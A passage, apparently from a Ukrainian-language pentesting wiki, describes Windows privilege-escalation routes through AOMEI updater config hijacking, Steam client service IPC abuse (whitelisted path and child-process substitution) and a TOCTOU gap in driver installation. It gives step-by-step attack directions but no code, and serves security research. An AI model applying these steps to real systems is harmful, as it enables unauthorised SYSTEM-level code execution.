Updater може використовувати окремі віддалені конфігурації, щоб **підготувати вміст і запустити його виконання**. Для цього потрібен контроль над конфігураціями або відповідями на них; у звітах не вказано, як саме було отримано доступ до джерела. У випадку AOMEI файл `down_html.ini` задавав URL архіву, версію (`thrid`) і MD5 (`Val`); зловмисник підвищив версію та змінив URL і відповідну контрольну суму. Це описана вище [помилка межі довіри до метаданих](#2-hijacking-the-update-channel-to-run-code-as-system). Додатковий шлях виконання використовував `Notifycfg.ini`: він вказував `ABNotify.exe` завантажити розпакований `upgrade-now.html` через локальну URL-адресу `file:///` у WebView. Сторінка автоматично переходила до виконуваного файлу в тій самій папці, який WebView передавав системній оболонці. Дочірній процес успадковував привілеї процесу-сповіщувача; це саме по собі не підвищувало його привілеї до SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google також повідомила про змінений `Notifycfg.ini`, що містив понад 35 000 повторюваних фіктивних секцій, які обходили звичайну перевірку версії клієнтом. У звіті не доведено наявність загального обходу парсера. Зловмисник відновлював віддалені файли після п’яти-десятихвилинних вікон, тож змінену конфігурацію отримували лише клієнти, що опитували сервер у цей час. Цей канал сповіщень також використовувався для окремої [приманки з примусовим WebDAV/NTLM-з’єднанням](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), для якої не потрібно було запускати архів.<sup>[[18]](#references)</sup>

## Перехід від shared memory до IPC привілейованої служби

Не зупиняйтеся на переліку іменованих каналів. SYSTEM-брокер може відкрити дозвільний іменований **file mapping** для встановлення з’єднання, а потім дублювати анонімні дескриптори каналів у процес, що надсилає запит. У перевіреній реалізації Steam `Global\SteamClientService_SharedMemFile` і `Global\SteamClientService_SharedMemLock` координують рукостискання клієнтського PID/події; служба повертає два дескриптори каналів, а для наступних запитів із префіксом довжини використовується `RunInterface` (`0x01`). DACL mapping-файлу дозволяв доступ клієнтам будь-якого рівня цілісності. Внутрішній об’єкт `CSteamServiceWin32` у `steamclient64.dll` слугував практичним клієнтом: знайдіть глобальну змінну, специфічну для збірки, викличте `Connect` у слоті 0 vtable, а потім використовуйте карти інтерфейсів замість повторної реалізації рукостискання. Доступ до IPC — лише необхідна умова; можливість підвищення привілеїв залежить від рішення довіряти запиту, яке ухвалює привілейований обробник. <sup>[[19]](#references)[[20]](#references)</sup>

### Підписаний маніфест розширює список дозволених застарілих виконуваних файлів

`IClientInstallUtils::AddInstallScriptToWhiteList` (слот 21) перевіряє `kvsignatures` підписаного VDF, але записує **розгорнутий шлях до виконуваного файлу**, а не незмінну ідентичність файлу. Для підписаного запису `Run Process`, наприклад `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, задайте доступний для запису користувачем `%INSTALLDIR%`. Помістіть підмінений виконуваний файл саме за цим розгорнутим шляхом, а потім викличте `RunInstallScript` (слот 22) із непідписаним VDF, у якому `Process 1` вказує шлях зі списку дозволених. Запис залишається чинним після виконання підписаного скрипту, аж до перезапуску служби; у дослідженій реалізації перед запуском від імені SYSTEM файл повторно не перевірявся. Ім’я підкладеного файлу має збігатися з фактичним підписаним записом, а не лише з категорією prerequisites. <sup>[[19]](#references)[[20]](#references)</sup>

### Дочірній процес module manager обходить перевірку підпису під час прямого завантаження

`IClientModuleManager::LoadModule` (слот 0) приймає байти модуля, якщо наданий ID збігається з їхнім CRC32. Виклик `CallFunctionAsync` (слот 3) із `flags & 8` обирає гілку **дочірнього процесу**, а не гілку прямого reflective-load, яка перевіряє підпис Valve. Служба записує `legacycompat\servicecall_<CRC>.dll` і запускає `legacycompat\steamservice.exe /runfunc ...` з каталогу інсталяції. Якщо цей каталог доступний користувачеві для запису, розмістіть виконуваний файл за останнім шляхом, завантажте будь-який тимчасовий модуль із відповідним CRC і викличте асинхронний метод, установивши біт 3. У дослідженій збірці дочірній виконуваний файл і записаний на диск DLL не автентифікувалися. Сам модуль не обов’язково має бути робочим payload: від імені SYSTEM запускається підмінений дочірній виконуваний файл. <sup>[[19]](#references)[[20]](#references)</sup>

### Перевірка членства в каталозі перед привілейованою інсталяцією драйвера

Для брокера інсталяції драйверів перевірте, чи прив’язана перевірка каталогу **до точного INF-файлу, переданого інсталятору**. У дослідженому шляху `InstallVrLinkDongleDriver` функція `WinVerifyTrust` перевіряє каталог, а `CryptCATAdminCalcHashFromFileHandle` шукає *принаймні один* відповідний файл у каталозі, заданому викликачем. Однак потім служба запускає `pnputil /add-driver ... /install` для `netrtwlanuval.inf`, не встановивши, що цей INF є потрібним членом каталогу. Приймається звичайний каталог або каталог для конкретної архітектури. Тому підписаний каталог, у якому є будь-який файл із відповідного каталогу, може пройти слабку перевірку служби, навіть якщо привілейованому інсталятору передано інший INF. Не вважайте, що цього достатньо для обходу політики підписування драйверів Windows: успішна інсталяція все одно залежить від підміненого пакета та політики хоста. <sup>[[19]](#references)[[20]](#references)</sup>

Служба закриває дескриптори перевірки до того, як `pnputil` відкриє INF, залишаючи [TOCTOU-вікно](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk), яке веде до інсталяції драйвера, а не до виконуваного файла оновлення. Oplock дає змогу синхронізувати підміну між перевіркою та відкриттям файла інсталятором. Той самий IPC також надає [переспрямування вводу з secure desktop](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring) за окремих умов, пов’язаних із згодою користувача. <sup>[[19]](#references)</sup>
